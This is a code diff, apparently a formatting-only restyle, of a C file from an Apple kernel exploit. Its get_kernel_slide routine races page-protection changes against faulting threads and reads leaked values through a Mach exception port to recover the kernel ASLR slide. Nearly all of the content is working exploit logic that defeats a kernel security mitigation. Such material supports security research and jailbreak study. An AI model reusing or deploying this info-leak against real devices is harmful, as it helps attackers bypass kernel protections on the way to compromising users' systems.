@@ -1,7 +1,7 @@
+#include <mach/mach.h>
 #include <pthread.h>
 #include <signal.h>
 #include <stdint.h>
-#include <mach/mach.h>
 
 #include "common.h"
 #include "infoleak.h"
@@ -15,8 +15,7 @@ __asm__(
     ".align 14\n"
     "_crashme:\n"
     "    .word 0xdeadbeef\n"
-    ".align 14"
-);
+    ".align 14");
 
 void clear_cache(uintptr_t start, uintptr_t end, uintptr_t __unused, uintptr_t type);
 __asm__(
@@ -34,12 +33,11 @@ __asm__(
 
 static volatile kptr_t kslide = 0;
 
-static void* catcher(void *arg)
+static void* catcher(void* arg)
 {
     mach_port_t port = *(mach_port_t*)arg;
     task_t self = mach_task_self();
-    while(1)
-    {
+    while (1) {
         // TODO: 32bit
 #pragma pack(4)
         typedef struct
@@ -68,8 +66,7 @@ static void* catcher(void *arg)
 #pragma pack()
         Request req;
         kern_return_t ret = mach_msg(&req.head, MACH_RCV_MSG | MACH_MSG_OPTION_NONE, 0, (mach_msg_size_t)sizeof(req), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-        if(ret != KERN_SUCCESS)
-        {
+        if (ret != KERN_SUCCESS) {
             LOG("mach_msg_receive: %s", mach_error_string(ret));
             break;
         }
@@ -77,11 +74,10 @@ static void* catcher(void *arg)
         mach_port_deallocate(self, req.thread.name);
         mach_port_deallocate(self, req.task.name);
 
-        if(!kslide && req.code[0] == 1 && req.code[1] != 0xdeadbeef)
-        {
+        if (!kslide && req.code[0] == 1 && req.code[1] != 0xdeadbeef) {
             uint32_t val = req.code[1];
             LOG("Leaked value: 0x%x", val);
-            if((val & 0xfffff) == (OFF_ANCHOR & 0xfffff)) // XXX 0xfffffff0070d4878
+            if ((val & 0xfffff) == (OFF_ANCHOR & 0xfffff)) // XXX 0xfffffff0070d4878
             {
                 kslide = val - OFF_ANCHOR;
             }
@@ -99,21 +95,19 @@ static void* catcher(void *arg)
         rep.flavor = req.flavor;
         rep.stateCnt = req.stateCnt;
         rep.state = req.state;
-        if(kslide)
-        {
+        if (kslide) {
             rep.state.__pc = (uint64_t)&pthread_exit;
             rep.state.__x[0] = 0;
         }
         ret = mach_msg(&rep.head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(rep), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-        if(ret != KERN_SUCCESS)
-        {
+        if (ret != KERN_SUCCESS) {
             LOG("mach_msg_send: %s", mach_error_string(ret));
         }
     }
     return NULL;
 }
 
-static void* crasher(void *arg)
+static void* crasher(void* arg)
 {
     mach_port_t port = *(mach_port_t*)arg;
     ASSERT_RET(out, "thread_set_exception_ports", thread_set_exception_ports(mach_thread_self(), EXC_MASK_ALL, port, EXCEPTION_STATE_IDENTITY, ARM_THREAD_STATE64)); // TODO: 32bit
@@ -124,8 +118,7 @@ out:;
 
 kptr_t get_kernel_slide(void)
 {
-    if(!kslide)
-    {
+    if (!kslide) {
         task_t self = mach_task_self();
         thread_t selfth = mach_thread_self();
         mach_port_t port = mach_reply_port();
@@ -137,12 +130,11 @@ kptr_t get_kernel_slide(void)
 
         ASSERT_RET(out, "task_threads", task_threads(self, &threads, &tnum));
         LOG("Got %u thread ports", tnum);
-        if(!threads || !tnum) goto out;
-        for(size_t i = 0; i < tnum; ++i)
-        {
+        if (!threads || !tnum)
+            goto out;
+        for (size_t i = 0; i < tnum; ++i) {
             thread_t t = threads[i];
-            if(t != selfth)
-            {
+            if (t != selfth) {
                 thread_suspend(t);
             }
         }
@@ -151,39 +143,32 @@ kptr_t get_kernel_slide(void)
         pthread_create(&cth, NULL, &catcher, &port);
 
         pthread_t th[NUMTH];
-        for(size_t i = 0; i < NUMTH; ++i)
-        {
+        for (size_t i = 0; i < NUMTH; ++i) {
             pthread_create(&th[i], NULL, &crasher, &port);
         }
         mach_vm_address_t addr = (mach_vm_address_t)&crashme;
         sig_t old = signal(SIGSEGV, SIG_IGN);
-        while(!kslide)
-        {
+        while (!kslide) {
             clear_cache(addr, addr + 4, 0, 0);
             mach_vm_protect(self, addr, 0x4000, 0, VM_PROT_NONE);
             mach_vm_protect(self, addr, 0x4000, 0, VM_PROT_READ | VM_PROT_EXECUTE);
         }
         LOG("kslide: " ADDR, kslide);
         signal(SIGSEGV, old);
-        for(size_t i = 0; i < NUMTH; ++i)
-        {
+        for (size_t i = 0; i < NUMTH; ++i) {
             pthread_join(th[i], NULL);
         }
         mach_port_destroy(self, port);
         port = MACH_PORT_NULL;
         pthread_join(cth, NULL);
     out:;
-        if(MACH_PORT_VALID(port))
-        {
+        if (MACH_PORT_VALID(port)) {
             mach_port_destroy(self, port);
         }
-        if(threads)
-        {
-            for(size_t i = 0; i < tnum; ++i)
-            {
+        if (threads) {
+            for (size_t i = 0; i < tnum; ++i) {
                 thread_t t = threads[i];
-                if(t != selfth)
-                {
+                if (t != selfth) {
                     thread_resume(t);
                 }
                 mach_port_deallocate(self, t);
